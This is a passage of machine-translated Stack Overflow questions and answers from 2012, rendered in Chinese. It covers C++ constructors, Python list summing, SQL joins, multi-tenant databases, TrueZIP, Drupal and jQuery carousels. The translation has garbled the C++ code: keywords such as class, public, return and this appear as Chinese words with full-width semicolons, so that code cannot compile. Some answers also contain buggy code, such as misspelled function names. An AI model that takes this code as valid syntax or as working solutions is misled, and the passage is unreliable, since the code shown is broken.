另外，如果你知道我告诉你的，它会给你更多的力量。您可以执行 10 个矩阵的序列，而无需将它们围绕在每个矩阵的多个 Matrix 对象中（例如，您想做一个向外摆动并围绕中心旋转以模拟离心力的摆动运动）。这需要通过多次旋转和平移来完成（由多个相互传递的 Matrix 对象包围），但是如果您知道每个平移的工作原理，您可以简单地执行一系列 .translate()、.rotate()、和.scale（）。

如果您曾经做过 3D 图形，则此信息特别有用，因为那时这些矩阵会让人头疼。

我希望这有帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T18:43:17.517

如果您不触摸画布但将相机旋转 90 度或保持相机静止但将其**查看**的画布旋转-90 度，则结果在视觉上是相同的。

# c++ - 类构造函数和对象实例化/初始化 C++/GCC

> ID：13429331
> 
> 赞同：4
> 
> 时间：2012-11-17T09:30:08.920
> 
> 标签：c++, class, gcc, constructor

我在使用 GCC 的 C++ 类构造函数方面遇到了麻烦。

下面的“foo”类应该模拟像 AL、AH、AX、EAX 等处理器寄存器，我需要一些与该类相关的基本算术。但我在初始化或“foo”对象中有一个奇怪的行为。

对于以下两种情况，我没有相同的结果：

```
富 w=0x12345678; // 情况1

富 w ; // 案例 2 初始化（2 步）
    w=0x12345678；

```

对我来说，案例 2 正在工作 GCC 调用 foo() （构造函数 1）然后是 = 运算符。最后， w.m_val 是可以的但对于案例 1 GCC 直接调用 foo(long *) （构造函数 2），仅此而已。显然这不是我所期待的。

如果 "foo" 位于 char 、 int 或 long 位置，则两种情况的结果都是相同的。

我可能对构造函数有误解或做错了什么。有人可以帮助我吗？

谢谢。

```
类 foo
{
    上市：
        foo(){ // 构造函数 1
          m_val=0；
          m_ptr=NULL；
          };

        foo(long *p){ // 构造函数 2，永远不应该被调用！！！
          m_val=0；
          m_ptr=p;
        };
        朋友 foo 运算符+( const foo &rhs, const unsigned int v );

        foo &operator+= (unsigned int v)
        {
            m_val+=v；
            返回*这个；
        }

        ~foo(){};

         foo &operator= ( const foo &rhs )
         {
            m_val=rhs.m_val;
            返回*这个；
         };
         foo &operator= ( const unsigned int v )
         {
            m_val=v;
            返回*这个；
         };

    私人的：
        无符号整数 m_val；
        长 *m_ptr;
};

```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T09:38:26.383

您对构造函数有误解。尽管出现，`foo w=0x12345678;`但不包含对赋值运算符的任何调用。它是*copy-initialization*，并且（大部分）等同于：

```
foo w{foo{0x12345678}}; 
```

这不应该编译，因为`foo`没有带`int`参数的构造函数。

我说“主要”是因为`foo w=0x12345678;`需要存在从`int`to `foo`（或 的子类`foo`）的隐式转换，其中`foo w{foo{0x12345678}};`涉及显式转换，并且永远不会构造 的子类`foo`。

# python - Python:列表加法

> ID：13429332
> 
> 赞同：1
> 
> 时间：2012-11-17T09:30:11.267
> 
> 标签：python, list, add

我有两个如下列表。我是从数据库中获取的

```
EmpID = Assign.objects.select_related().filter(pName=selProject).filter()
    .order_by('laEmpNum').values_list('laEmpNum', flat=True)

TotDur = Assign.objects.select_related().filter(pName=selProject).order_by('laEmpNum')
    .values_list('duration', flat=True)

EmpID = [u'1046', u'1046', u'1046', u'8008', u'8008', u'8011'] 

TotDur = [0.0, 2.0, 2.5, 0.0, 2.7, 1.2] 
```

如果 EmpID 相同，则 TotDur 中的相应值应收集并添加（总和）。

```
ResOne = 0.0 + 2.0 + 2.5    i.e 4.5
ResTwo = 0.0+2.7            i.e 2.7
ResThr = 1.2                i.e 1.2 
```

如何在 Python 中做到这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T09:39:33.283

[`defaultdict`](http://docs.python.org/2/library/collections.html#collections.defaultdict)是一个很好的数据结构，对于`int`字段，它假定`0`新键的值，并允许轻松收集桶：

```
from collections import defaultdict
d = defaultdict(int)
for i, j in zip(EmpID, TotDur):
    d[i] += j
print d # defaultdict(<type 'int'>, {u'8008': 2.7, u'1046': 4.5, u'8011': 1.2}) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-17T09:42:24.233

如果元素按您在示例中显示的顺序排列，则可以使用[itertools.groupby](http://docs.python.org/2/library/itertools.html#itertools.groupby)

```
from itertools import groupby
from operator import itemgetter
[(k , sum(e for _,e in v)) for k,v in groupby(zip(EmpID, TotDur), itemgetter(0))]
[(u'1046', 4.5), (u'8008', 2.7), (u'8011', 1.2)] 
```

事实上你不需要创建两个单独的列表并在以后压缩它

```
Emp_TotDur = Assign.objects.select_related().filter(pName=selProject).filter()
    .order_by('laEmpNum').values_list('laEmpNum', 'duration')

[(k , sum(e for _,e in v)) for k,v in groupby(Emp_TotDur, itemgetter(0))] 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-17T09:37:25.747

你可以使用[`defaultdict`](http://docs.python.org/dev/library/collections#collections.defaultdict)：

```
In [60]: from collections import *

In [61]: EmpID = [u'1046', u'1046', u'1046', u'8008', u'8008', u'8011']

In [62]: TotDur = [0.0, 2.0, 2.5, 0.0, 2.7, 1.2]

In [63]: d=defaultdict(int)

In [64]: for x,y in zip(EmpID,TotDur):
    d[x]+=y
   ....:     

In [65]: d
Out[65]: defaultdict(<type 'int'>, {u'8008': 2.7, u'1046': 4.5, u'8011': 1.2}) 
```

或者简单地说`dict`：

```
In [70]: d=dict()

In [71]: for x,y in zip(EmpID,TotDur):
    d[x]=d.get(x,0)+y
   ....:     

In [72]: d
Out[72]: {u'1046': 4.5, u'8008': 2.7, u'8011': 1.2} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-17T09:39:34.067

你可以这样做

```
l1 = [1,1,2,3,3]
l2 = [1,2,3,4,5]
last_val=l1[0]
sum=0
list=[]
for pair in zip(l1,l2): 
    if pair[0]!=last_val:
        print(sum)
        list.append(sum)
        sum=0
    last_val=pair[0]
    sum+=pair[1]
list.append(sum)
print(list) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-17T09:40:47.000

您可以[压缩](http://docs.python.org/2/library/functions.html#zip)这两个列表，将第一个列表的元素与第二个列表的元素配对成元组。然后遍历它们并使用元组的第一部分作为字典中的键：

```
EmpID = [u'1046', u'1046', u'1046', u'8008', u'8008', u'8011']
TotDur = [0.0, 2.0, 2.5, 0.0, 2.7, 1.2]
Result = {}

for (key, value) in zip(EmpID, TotDur):
    if not key in Result:
        Result[key] = value
    else:
        Result[key] += value

# Print the result
for (key, value) in Result.items():
    print key, value 
```

如果要保留 Emps 的顺序，您可能需要使用[OrderedDict](http://docs.python.org/2/library/collections.html#collections.OrderedDict)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-17T09:44:24.163

试试这个，它将所有相应 id 值的总和放入一个列表，稍后您可以使用 empId 访问该列表并查看其总和。

```
finalList = []
lastEmpId

for index, emp in enumarate(EmdIP):
    if lastEmpId == emp:
        finalList[lastEmpId] += TotDur[index]
    else:
        finalList[lastEmpId] = TotDur[index]
    lastEmpId = emp;

print finalList 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-17T18:15:03.563

```
 python 3.2
    res=[]
    for i in set(ID):
         b=[]
         for x,y in enumerate(ID):
              if i==y: b.append(T[x])
    res.append(sum(b)) 
```

# python-3.x - 如何在python中进行连接

> ID：13429334
> 
> 赞同：1
> 
> 时间：2012-11-17T09:30:41.790
> 
> 标签：python-3.x

```
first = 'a'
second = 1
third = 'c' 
```

我希望结果是“a1c”，只使用第一、第二和第三个变量，并且只使用字符串连接。

我将如何实现这一目标。？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:34:58.103

您可以简单地说`output = first+str(second)+third` 这是[如何在 Python 中连接字符串和数字？](https://stackoverflow.com/questions/6981495/how-can-i-concatenate-a-string-and-a-number-in-python)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:07:30.413

你可以试试`"{}{}{}".format(first, second, third)`。

请参阅[字符串格式文档](http://docs.python.org/3/library/string.html#format-string-syntax)。

# pyrocms - 有没有在 pyrocms 联系表格中添加验证码的快速方法？

> ID：13429336
> 
> 赞同：1
> 
> 时间：2012-11-17T09:31:00.410
> 
> 标签：pyrocms

我正在通过修改 pyrocsms 标准安装的默认联系表格来制作一个非常简单的联系表格。我查看了有关添加验证码的文档，但似乎没有找到任何明确的添加方法。是否有简化在 PyroCMS 中添加验证码的插件/插件？或者，我应该更深入地了解 CodeIgniter 验证码助手，如下所示：[验证码助手](http://codeigniter.com/user_guide/helpers/captcha_helper.html)？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-19T19:07:25.900

很久以前我们在那里有一个验证码，但社区的明确意见是，这是一个痛苦的屁股，更多的人反对它而不是支持它。

相反，我们实现了 Akismet，因此您可以直接使用它。这样他们会检查它是否为您发送垃圾邮件，而不是如此费力地纠缠您的用户，他们甚至都不会费心提交表单。

# php - 触发 SQL 查询或在 php 中处理结果哪个更好？

> ID：13429337
> 
> 赞同：0
> 
> 时间：2012-11-17T09:31:09.167
> 
> 标签：php, mysql

我有两张桌子`Question`，并且`Option`有一对多的关系。从两个表中获取结果后，结果数组应该是这样的

> Question = array( //问题表的结果
> 
> ```
>  Option = array(
>          //result from the Option Table
>      ) 
> ```
> 
> );

假设如果我想从数据库中获取 10 个问题，那么我可以通过两种方式做到这一点（我认为）

1.  通过加入两个表并从数据库中获取数据并使用它进行 PHP 循环和控制。（我更喜欢这个）

2.  通过获取`Question`然后触发 10 查询`Option`。（这很容易，因为我们不需要像1的情况那样处理）

我想知道在 PHP 中处理结果或使用 SQL 查询哪个更好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T09:35:15.967

通常，编写一个连接查询要好得多：

*   您只需向数据库发出 1 个请求，而不是 11 个（一个用于问题，10 个用于选项）。数据库查询是一项非常昂贵的操作 - 每次您进行查询时，都会向数据库发出网络请求。
*   即使我们忽略网络往返时间的差异，数据库引擎也可以优化查询以可能运行得更快。
*   与循环查询的 PHP 代码相比，阅读、理解和修改一个连接查询要容易得多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T09:32:48.183

`join`会更快并节省服务器上的负载，所以加入（选项1）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T09:34:01.297

Offcourse Join 更好，因为这样你只在 UI 上得到你想要的并且负载是平衡的。

在第二个选项中，您所做的是从数据库中获取所有记录，然后根据您的需要处理它们，所以它太多了......

请记住 Basic 仅获取那些需要的信息。

# winrt-xaml - 使用reactiveui时winrt中的Designdata

> ID：13429343
> 
> 赞同：0
> 
> 时间：2012-11-17T09:31:55.477
> 
> 标签：winrt-xaml, reactiveui

我正在尝试使用反应式 ui 构建一个 WinRT 应用程序，并且在构建设计数据时遇到以下错误：

'ReactiveUI.RxApp' 的类型初始化程序引发异常 ArgumentNullException：值不能为空。参数名称：调度器

我的设计数据如下所示：

```
<FormViewModel xmlns="using:sRM.Controls.ViewModels">
    <FormViewModel.Form>
       <Form xmlns="using:sRM.Models.Forms" Name="Design form"/>
    </FormViewModel.Form>
 </FormViewModel> 
```

对于我的视图模型

```
public class FormViewModel : ReactiveViewModel, IFormViewModel
{
    private readonly IFormsService _formsService;
    //private AccountViewModel _Data;
    private Form _Form;

    public FormViewModel() 
    {

    }
 .. 
```

任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T23:59:30.170

这[应该](https://github.com/reactiveui/ReactiveUI/commit/be5c861b8b2c29dd98ec5bf918eff77e618d9ec5)在即将发布的最新版本中修复！

**更新：**现在在 ReactiveUI 4.3.0 中发布

# eclipse-plugin - Jar在eclipse中签名，更改源后如何辞职

> ID：13429344
> 
> 赞同：0
> 
> 时间：2012-11-17T09:31:58.103
> 
> 标签：eclipse-plugin, eclipse-jdt, jar-signing

我不得不更改 org.eclipse.jdt.core.dom.ASTNode 中的一些源代码，我在应用程序设计中使用各种 eclipse 插件作为“无头”库以特定方式重构源代码。

我只是在最后才发现 ASTNode 中有一行代码，这使得应用程序无法运行。

最快的方法似乎是反编译注释掉该行并再次打包 jar。我现在遇到的问题是：

```
Exception in thread "main" java.lang.SecurityException: SHA1 digest error for org/eclipse/jdt/core/dom/ASTNode.class
at sun.security.util.ManifestEntryVerifier.verify(ManifestEntryVerifier.java:198)
at java.util.jar.JarVerifier.processEntry(JarVerifier.java:212)
at java.util.jar.JarVerifier.update(JarVerifier.java:199) 
```

此应用程序只需运行一次即可重构大型代码库。我正在寻找最快的解决方案。

如果有某种方法可以禁用安全性，实际上有一个启动参数：

```
startup option -Declipse.p2.unsignedPolicy=allow 
```

这对我没有帮助，因为图书馆是无头的。另一个可能的解决方案是辞职 jar 但我认为需要一个密钥或其他东西。

因为它是一次性应用程序，所以我不需要干净的修复，只要任何快速的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:40:54.613

签署 jar 的方法是使用 Java -cp 选项，如下所示

```
java -cp "jcifs-1.3.17.jar:jespa-1.1.14.jar" jespa.License -u jespa_500_license_SN2136020120531.key 
```

# ios - IOS Google Drive SDK API 下载文件数据

> ID：13429348
> 
> 赞同：2
> 
> 时间：2012-11-17T09:33:03.677
> 
> 标签：ios, google-drive-api

我将谷歌驱动器与我的 ios 应用程序集成在一起。但是，每当我尝试选择要下载的任何文件时，下载 url 都会以**&gd=true**结尾。我不知道最后一部分是什么**"&gd=true"**。当我删除该字符串并尝试下载文件内容时，它工作正常。此外，当我包含它时，我无法下载文件内容。是谷歌错误还是我遗漏的东西？

*   洛甘纳坦

# javascript - chrome 中的 Javascript 拆分函数给出了意想不到的结果

> ID：13429360
> 
> 赞同：4
> 
> 时间：2012-11-17T09:35:09.257
> 
> 标签：javascript

这是一段代码

```
str = "a,b,c";
name = str.split(","); 
```

该`name`变量在 Firefox 中显示为“object”类型，在 chrome 中显示为“string”类型。为什么会这样？这是 jsfiddle [http://jsfiddle.net/XujYT/17/](http://jsfiddle.net/XujYT/17/)

此外，该`name`变量 在 chrome [http://jsfiddle.net/XujYT/23/](http://jsfiddle.net/XujYT/23/)`"a,b,c"`中存储值而不是拆分数组

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-17T09:37:24.543

因为`name`是 chrome 使用的全局变量，如果没有意外结果是不可能覆盖它的。尝试：

```
var name = str.split(","); // always use var for local variables! 
```

# sql - 数据库客户端特定表与关系表

> ID：13429363
> 
> 赞同：3
> 
> 时间：2012-11-17T09:35:16.553
> 
> 标签：sql, database, relational-database, multi-tenant

我有一个场景，我的应用程序是一个基于 SAAS 的应用程序，可满足多个客户的需求。对客户的数据完整性非常重要。

保留我的桌子更好吗

1.  客户特定或
2.  关系表

例如：我有一个包含字段 MapField1、MapField2 的映射表。我需要为每个客户提供这种数据。

我应该有像 MappingData_ 这样的表吗

或映射到 ClientId 的单个表

具有字段 MapField1、MapField2、ClientId 的 MappingData

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:51:15.430

我将为每个客户建立一个单独的***数据库***。 *（单个 SQL Server 实例中的多个数据库。）*

这将允许您使用单个架构设计一次。

*   没有影响测试和开发的动态命名表
*   升级和维护可以在一个数据库中设计和测试，然后推广到所有数据库
*   单个客户的数据可以非常简单地备份、恢复或删除
*   在一个数据库中发现/利用的错误不会构成其他数据库的完整性
*   可以使用 SQL 登录管理数据访问（读取***和***写入）（无需重新发明轮子）

如果需要全局共享数据，那将进入另一个数据库，它拥有针对不同 SQL 登录名的一组权限。

使用包含所有用户的单个数据库是我的下一个最佳选择。您仍然有一个模式。但是您无法对客户的数据进行分区，您需要自己管理访问权限和权限，以及大量其他额外的设计和测试工作。

我***永远不会***为其他客户动态创建新表。一个新的表名意味着您的所有查询都需要使用新的表名进行更新，以及一大堆其他维护难题。

我的观点是，如果您想在应用程序/服务的*正常*使用期间动态创建表，那么您的设计就很糟糕。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T15:05:41.177

SO有一个你所描述的东西的标签：“多租户”。

将支持多租户数据库应用程序的架构可视化为频谱。频谱的一个极端是“无共享”，这意味着每个租户都有自己的数据库。在频谱的另一个极端是“共享一切”，这意味着租户共享表，每个表中的每一行都属于一个租户。（每行包含一个租户标识符。）

术语似乎重叠，因此请仔细阅读。一位作者所说的*共享模式*可能与另一位作者所说的*共享所有内容*相同。

[这个 SO answer](https://stackoverflow.com/a/8343142/562459)也是由我编写的，描述了成本、数据隔离和保护、维护和灾难恢复方面的差异和权衡。它还链接到一篇相当不错的介绍性文章。

# java - 使用 TrueZIP 复制文件异常

> ID：13429364
> 
> 赞同：1
> 
> 时间：2012-11-17T09:35:20.987
> 
> 标签：java, truezip

这是我`war`使用**TrueZIP**将文件复制到另一个文件的代码。

```
TFile srcFile = new TFile(sourceFilePath);
TFile destFile = new TFile(destFilePath);
if (!destFile.getParentFile().exists()) {
    destFile.getParentFile().mkdirs();
}

try {
    srcFile.cp_rp(destFile);
    TVFS.umount();
} catch (IOException e) {
    e.printStackTrace();
} 
```

例如，源文件位置：

> `I:\Code-Base\test.7.2.0\projects\test\main\branches\test.7.2.0_for_test\ui\portlets\dist\portlets.war\WEB-INF\server-config.wsdd`

和目的地位置：

> `D:\deploy\work\237798_237980\web\deploy\prtlets.war\WEB-INF\server-config.wsdd`

我已经检查过这两条路径是否存在，但我收到一个`InputException`错误::

```
de.schlichtherle.truezip.io.InputException: de.schlichtherle.truezip.fs.FsReadOnlyArchiveFileSystemException: This is a read-only archive file system!
    at de.schlichtherle.truezip.socket.IOSocket.copy(IOSocket.java:102)
    at de.schlichtherle.truezip.file.TBIO.cp0(TBIO.java:221)
    at de.schlichtherle.truezip.file.TBIO.cp_r0(TBIO.java:179)
    at de.schlichtherle.truezip.file.TBIO.cp_r(TBIO.java:138)
    at de.schlichtherle.truezip.file.TFile.cp_rp(TFile.java:3210)
    at com.accela.work.WorkThread.run(WorkThread.java:110)
    at com.accela.work.Worker.getUpgradePackageByVersion(Worker.java:162)
    at com.accela.work.Main.generateUpgradePackage(Main.java:114)
    at com.accela.work.Main.getUpgradePackageByVersion(Main.java:107)
    at com.accela.work.Main.main(Main.java:75)
Caused by: de.schlichtherle.truezip.fs.FsReadOnlyArchiveFileSystemException: This is a read-only archive file system!
    at de.schlichtherle.truezip.fs.FsReadOnlyArchiveFileSystem.mknod(FsReadOnlyArchiveFileSystem.java:54)
    at de.schlichtherle.truezip.fs.FsBasicArchiveController$1Output.mknod(FsBasicArchiveController.java:273)
    at de.schlichtherle.truezip.fs.FsBasicArchiveController$1Output.getLocalTarget(FsBasicArchiveController.java:220)
    at de.schlichtherle.truezip.fs.FsBasicArchiveController$1Output.getLocalTarget(FsBasicArchiveController.java:217)
    at de.schlichtherle.truezip.fs.FsContextController$Output.getLocalTarget(FsContextController.java:296)
    at de.schlichtherle.truezip.fs.FsContextController$Output.getLocalTarget(FsContextController.java:280)
    at de.schlichtherle.truezip.socket.DelegatingOutputSocket.getLocalTarget(DelegatingOutputSocket.java:47)
    at de.schlichtherle.truezip.socket.DelegatingOutputSocket.getLocalTarget(DelegatingOutputSocket.java:21)
    at de.schlichtherle.truezip.socket.DelegatingOutputSocket.getLocalTarget(DelegatingOutputSocket.java:47)
    at de.schlichtherle.truezip.socket.DelegatingOutputSocket.getLocalTarget(DelegatingOutputSocket.java:21)
    at de.schlichtherle.truezip.fs.FsSyncController$Output.getLocalTarget(FsSyncController.java:421)
    at de.schlichtherle.truezip.fs.FsSyncController$Output.getLocalTarget(FsSyncController.java:408)
    at de.schlichtherle.truezip.fs.FsLockController$Output$1GetLocalTarget.call(FsLockController.java:498)
    at de.schlichtherle.truezip.fs.FsLockController$Output$1GetLocalTarget.call(FsLockController.java:495)
    at de.schlichtherle.truezip.fs.FsLockController.locked(FsLockController.java:316)
    at de.schlichtherle.truezip.fs.FsLockController.writeLocked(FsLockController.java:268)
    at de.schlichtherle.truezip.fs.FsLockController$Output.getLocalTarget(FsLockController.java:501)
    at de.schlichtherle.truezip.fs.FsLockController$Output.getLocalTarget(FsLockController.java:484)
    at de.schlichtherle.truezip.socket.DelegatingOutputSocket.getLocalTarget(DelegatingOutputSocket.java:47)
    at de.schlichtherle.truezip.socket.DelegatingOutputSocket.getLocalTarget(DelegatingOutputSocket.java:21)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController$1Output$GetLocalTarget.call(FsFalsePositiveArchiveController.java:374)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController$1Output$GetLocalTarget.call(FsFalsePositiveArchiveController.java:367)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController$TryChild.call(FsFalsePositiveArchiveController.java:507)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController.call(FsFalsePositiveArchiveController.java:104)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController$1Output.getLocalTarget(FsFalsePositiveArchiveController.java:364)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController$1Output.getLocalTarget(FsFalsePositiveArchiveController.java:348)
    at de.schlichtherle.truezip.socket.InputSocket.getPeerTarget(InputSocket.java:50)
    at de.schlichtherle.truezip.fs.FsBasicArchiveController$1Input.getDelegate(FsBasicArchiveController.java:199)
    at de.schlichtherle.truezip.socket.DelegatingInputSocket.getBoundSocket(DelegatingInputSocket.java:43)
    at de.schlichtherle.truezip.socket.DelegatingInputSocket.newInputStream(DelegatingInputSocket.java:63)
    at de.schlichtherle.truezip.fs.FsContextController$Input.newInputStream(FsContextController.java:273)
    at de.schlichtherle.truezip.fs.FsResourceController$Input.newInputStream(FsResourceController.java:242)
    at de.schlichtherle.truezip.socket.DelegatingInputSocket.newInputStream(DelegatingInputSocket.java:63)
    at de.schlichtherle.truezip.fs.FsSyncController$Input.newInputStream(FsSyncController.java:378)
    at de.schlichtherle.truezip.fs.FsLockController$Input$1NewInputStream.call(FsLockController.java:455)
    at de.schlichtherle.truezip.fs.FsLockController$Input$1NewInputStream.call(FsLockController.java:452)
    at de.schlichtherle.truezip.fs.FsLockController.locked(FsLockController.java:328)
    at de.schlichtherle.truezip.fs.FsLockController.writeLocked(FsLockController.java:268)
    at de.schlichtherle.truezip.fs.FsLockController$Input.newInputStream(FsLockController.java:459)
    at de.schlichtherle.truezip.fs.FsFinalizeController$Input.newInputStream(FsFinalizeController.java:177)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController$1Input$NewInputStream.call(FsFalsePositiveArchiveController.java:333)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController$1Input$NewInputStream.call(FsFalsePositiveArchiveController.java:326)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController$TryChild.call(FsFalsePositiveArchiveController.java:507)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController.call(FsFalsePositiveArchiveController.java:104)
    at de.schlichtherle.truezip.fs.FsFalsePositiveArchiveController$1Input.newInputStream(FsFalsePositiveArchiveController.java:323)
    at de.schlichtherle.truezip.socket.IOSocket.copy(IOSocket.java:100)
    ... 9 more 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T11:10:05.910

TrueZIP 做了一个简单的测试来检查存档文件是否可写。如果此测试失败，归档文件系统将设置为只读，如异常所示。

在大多数情况下，这只是访问权限的问题。但是Windows特别讨厌。例如，如果有另一个工具同时访问存档文件（许多 Explorer 插件都这样做），那么该文件实际上也是只读的。

因此，在操作运行时，请远离存档文件（最好是其目录）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T09:58:05.427

您不能对只读文件进行替换，因为您必须删除它，即写入它。

确保您的 destFile 是可写的。

# drupal - Drupal 应用程序开发

> ID：13429369
> 
> 赞同：0
> 
> 时间：2012-11-17T09:36:10.223
> 
> 标签：drupal

```
name = MagApp 1.0
description = Magapp module that enables MagApp powered publications.
core = 7.x
php = 5.1
package = MagApp
dependencies[] = references
dependencies[] = node_reference
dependencies[] = magapp_core_content_types
version = "7.x-2.0" 
```

我已经创建了一个模块，上面写了信息文件，更改php版本时是否有任何问题，因为我是几个月前做的，所以我必须更新这个模块，我可以不使用模块直接添加依赖项。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T09:46:30.377

在 /modules 的源代码中搜索 admin/structure 并检查他们是如何构建 *_menu() 挂钩的。

如果您有权访问服务器并且它正在运行 *NIX，您可以执行以下操作：

```
grep -ri 'admin/structure' your_site_directory/modules/* 
```

然后你可以在你自己的模块中实现你自己的[hook_menu()](http://api.drupal.org/api/drupal/modules!system!system.api.php/function/hook_menu/7)。也可能在 Web UI 的结构 -> 菜单系统中实现。我不记得了。

# jquery - 一页上需要多个 elastislide 图像查看器

> ID：13429373
> 
> 赞同：0
> 
> 时间：2012-11-17T09:37:12.667
> 
> 标签：jquery, image-gallery, image-viewer

我发现了这个漂亮的图像滑块：[http ://tympanus.net/codrops/2011/09/12/elastislide-responsive-carousel/](http://tympanus.net/codrops/2011/09/12/elastislide-responsive-carousel/)

由于我正在使用这种设计开发一个活动网站：[我的网页设计](http://i.stack.imgur.com/Kw4oB.png)，我很想在一页上添加多个 (3) 滑块。我是 jquery 的新手，因此很难编辑 jquery 代码，因此它可以识别 html 上的多个列表以呈现轮播。

```
<!-- Elastislide Carousel rendering on html-->
     <ul id="carousel" class="elastislide-list">
        <li><a href=""><img src="images/small/1.jpg" alt="image01" /></a></li>
        <li><a href="#"><img src="images/small/2.jpg" alt="image02" /></a></li>
        <li><a href="#"><img src="images/small/3.jpg" alt="image03" /></a></li>
        <li><a href="#"><img src="images/small/4.jpg" alt="image04" /></a></li>
        <li><a href="#"><img src="images/small/5.jpg" alt="image05" /></a></li>
        <li><a href="#"><img src="images/small/6.jpg" alt="image06" /></a></li>

     </ul> 
```

这里的脚本：

```
 <script type="text/javascript"> 
    $( '#carousel' ).elastislide( {minItems : 2} );
    </script> 
```

有人请帮帮我！！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-30T10:56:01.707

我使用了class而不是id，但仍然没有。2 滑块不起作用。但是，每个都使用jquery，它起作用了：

```
jQuery('.carousel').each(function(){
    jQuery(this).elastislide( {
        minItems : 2
    });
}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T09:48:40.440

只需使用类而不是 id，如下所示

```
 <ul id="carousel1" class="elastislide-list myCarousel">
    <li><a href=""><img src="images/small/1.jpg" alt="image01" /></a></li>
    <li><a href="#"><img src="images/small/2.jpg" alt="image02" /></a></li>
    <li><a href="#"><img src="images/small/3.jpg" alt="image03" /></a></li>
    <li><a href="#"><img src="images/small/4.jpg" alt="image04" /></a></li>
    <li><a href="#"><img src="images/small/5.jpg" alt="image05" /></a></li>
    <li><a href="#"><img src="images/small/6.jpg" alt="image06" /></a></li>

 </ul>

 <ul id="carousel2" class="elastislide-list myCarousel">
    <li><a href=""><img src="images/small/1.jpg" alt="image01" /></a></li>
    <li><a href="#"><img src="images/small/2.jpg" alt="image02" /></a></li>
    <li><a href="#"><img src="images/small/3.jpg" alt="image03" /></a></li>
    <li><a href="#"><img src="images/small/4.jpg" alt="image04" /></a></li>
    <li><a href="#"><img src="images/small/5.jpg" alt="image05" /></a></li>
    <li><a href="#"><img src="images/small/6.jpg" alt="image06" /></a></li>

 </ul> 
```

javascript代码

```
<script type="text/javascript"> 
 $( '.myCarousel' ).elastislide( {minItems : 2} );
</script> 
```

像这样使用短的

```
 <script type="text/javascript"> 
   $( '#carousel,#carouse2' ).elastislide( {minItems : 2} );
 </script> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-17T10:35:58.410

通过使用不同的 id 并分别调用每个 id 找到了解决方案，如下所示：

```
<ul id="carousel1" class="elastislide-list">
    <li><a href=""><img src="images/small/1.jpg" alt="image01" /></a></li>
    <li><a href="#"><img src="images/small/2.jpg" alt="image02" /></a></li>
    <li><a href="#"><img src="images/small/3.jpg" alt="image03" /></a></li>
    <li><a href="#"><img src="images/small/4.jpg" alt="image04" /></a></li>
    <li><a href="#"><img src="images/small/5.jpg" alt="image05" /></a></li>
    <li><a href="#"><img src="images/small/6.jpg" alt="image06" /></a></li>

 </ul>

 <ul id="carousel2" class="elastislide-list">
    <li><a href=""><img src="images/small/1.jpg" alt="image01" /></a></li>
    <li><a href="#"><img src="images/small/2.jpg" alt="image02" /></a></li>
    <li><a href="#"><img src="images/small/3.jpg" alt="image03" /></a></li>
    <li><a href="#"><img src="images/small/4.jpg" alt="image04" /></a></li>
    <li><a href="#"><img src="images/small/5.jpg" alt="image05" /></a></li>
    <li><a href="#"><img src="images/small/6.jpg" alt="image06" /></a></li>

 </ul> 
```

javascript代码

```
<script type="text/javascript"> 
$( '#carousel' ).elastislide( {minItems : 2} );
$( '#carouse2' ).elastislide( {minItems : 2} );
</script> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-06-10T06:00:51.073

如果您想拥有 2 个具有自己导航的不同滑块，但如果您想拥有一个导航并控制两个滑块，这是一个很好的解决方案，这里有一个快速片段可以帮助您解决它。使用 display:none 隐藏 elastislide 默认按钮

```
.elastislide-prev{
    display: none;
}

.elastislide-next{
    display: none;
} 
```

**添加您自己的自定义导航：**

```
<nav>
<span class="elastislide-newleft a" style="display: block;">Previous</span>
<span class="elastislide-newright b" style="display: block;">Next</span>
</nav> 
```

**在弹性滑动 js 中：**

**将以下内容添加到 _addControls ： function() {**

```
var xyz = $('.fixed-bar');

this.$navPrev = xyz.find( 'span.elastislide-newleft' ).on( 'mousedown.elastislide', function( event ) {
                self._slide( 'prev' );
                return false;
} );
this.$navNext = xyz.find( 'span.elastislide-newright' ).on( 'mousedown.elastislide', function( event ) {
                self._slide( 'next' );
                return false;
} ); 
```

这将帮助您一键滑动 2 个滑块，创建非常好的网格轮播效果。

# iteration - 了解递归关系

